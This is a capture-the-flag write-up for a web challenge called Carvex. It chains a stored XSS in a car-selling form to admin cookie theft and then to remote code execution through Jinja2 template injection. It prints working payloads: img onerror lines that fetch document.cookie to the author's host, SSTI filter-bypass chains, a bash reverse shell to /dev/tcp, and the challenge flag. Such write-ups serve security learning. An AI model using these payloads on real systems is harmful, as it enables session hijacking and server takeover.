# Carvex Writeup

I am Sahib Humbatzada and open always to challenges and ctfs. This type of challenges always motivates me to learn web security.


## App Deployed

![alt text](img/image.png)

## Checklists for vulnerabilities

```bash
SSTI payloads for search parameter
SQLI payload for search parameter
SQLI payloads for Sell your car parameters
XSS payloads for Sell your car parameters # succeed)

GET /api/suggest?q={payload}
POST /sell (body=> title=%3Csvg+onload%3Dalert%281%29%3E&make=12321&model=12321&year=12321&price=123213&mileage=123213&image_url=12321&description=12321312)
```


## JWT Decoding

While decoding jwt, i see that `uid` is `7`. It means that, on database, there are other users exists. It can be normal user and admin user.

![alt text](img/image-2.png)

## Sell Feature

On this feature, I can add XSS payload as below.

![alt text](img/image-1.png)

Let's add this `blind xss` payload and `photo url`, let's add our server.

```bash
<img src=x onerror=fetch("http://192.168.100.179:1337/"+document.cookie);>
```

![alt text](img/image-3.png)

While  I submit this, on my http.server logs and i see that file retrieval happened.

![alt text](img/image-4.png)

It means that we found `SSRF` vulnerability. It validated Photo URL without any validation of ip.

## Stealing cookie of admin

I looked cookie flags and see that i can steal cookie of target easily.

![alt text](img/image-5.png)

I develop [steal.js](steal.js) and serve on my attacker server.

Let's upload as below.

```bash
http://192.168.100.179:1337/steal.js
```

![alt text](img/image-6.png)

But this way doesn't work. It gets my JS script but no execution.

I created another user `testv2` and browsed all cars listing for first user. But i cannot see machines for first user. 

I developed this python [server](server.py) to see real SSRF.

```python
from http.server import HTTPServer, BaseHTTPRequestHandler

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        print("[+] Headers:\n", self.headers)  # check User-Agent here too
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"SSRF_TEST_12345")

HTTPServer(('0.0.0.0', 1337), Handler).serve_forever()
```

![alt text](img/image-7.png)

So, i see that `Referer` header is from port `5000`.

Also, `accept` header shows image content types.

That's why, I changed payloads as below.

```bash
# XSS
http://192.168.100.179:1337/x.png" onerror="fetch('http://192.168.100.179:1337/steal?c='+document.cookie)
```

![alt text](img/image-8.png)

Yesss, it worked. I copy paste this cookie to jwt.io and see uid is `1`. It means most probably admin user.

![alt text](img/image-9.png)

![alt text](img/image-10.png)

Yes, we are admin user.

## RCE (with SSTI)

![alt text](img/image-11.png)

We see `promo` feature, we can edit. We don't need to work with XSS as because we are admin.

We need to paste payloads, which we achieve command execution.

First, i started with SSTI.

![alt text](img/image-12.png)

![alt text](img/image-13.png)

I see that this worked. It means we can achieve `RCE` via `SSTI` vulnerability

I see error which i need to bypass.

![alt text](img/image-14.png)

I submit below payloads from Google, I find.

```bash
payload : {{ ''|attr('_'*2+'class'+'_'*2)|attr('_'*2+'mro'+'_'*2) }}
```

![alt text](img/image-15.png)


```bash
payload: {{ ''|attr('_'*2+'class'+'_'*2)|attr('_'*2+'mro'+'_'*2)|attr('_'*2+'getitem'+'_'*2)(1)|attr('_'*2+'subclasses'+'_'*2)() }}
```

![alt text](img/image-16.png)

Finally, I used this payload and achieve command execution.

```bash
{{ ''|attr('_'*2+'class'+'_'*2)|attr('_'*2+'mro'+'_'*2)|attr('_'*2+'getitem'+'_'*2)(1)|attr('_'*2+'subclasses'+'_'*2)()|selectattr('_'*2+'name'+'_'*2,'equalto','_wrap_close')|list|first|attr('_'*2+'init'+'_'*2)|attr('_'*2+'globals'+'_'*2)|attr('_'*2+'getitem'+'_'*2)('popen')('id')|attr('read')() }}
```


![alt text](img/image-17.png)

```bash
## reverse shell
{{ ''|attr('_'*2+'class'+'_'*2)|attr('_'*2+'mro'+'_'*2)|attr('_'*2+'getitem'+'_'*2)(1)|attr('_'*2+'subclasses'+'_'*2)()|selectattr('_'*2+'name'+'_'*2,'equalto','_wrap_close')|list|first|attr('_'*2+'init'+'_'*2)|attr('_'*2+'globals'+'_'*2)|attr('_'*2+'getitem'+'_'*2)('popen')('bash -c \"bash -i >& /dev/tcp/192.168.100.179/4444 0>&1\"') }}
```

Hola, I got reverse shell.

![alt text](img/image-18.png)


**Without AI,** on `OSWE` exam, you open swisskeyrepo [payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#jinja2---filter-bypass) on github and there's one super payload waits you to achieve command execution

```bash
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

![alt text](img/image-20.png)

![alt text](img/image-21.png)


## Flag

![alt text](img/image-19.png)

```bash
nnsec{carvex_pwn3d_full_ch4in_rce_4f9a1c}
```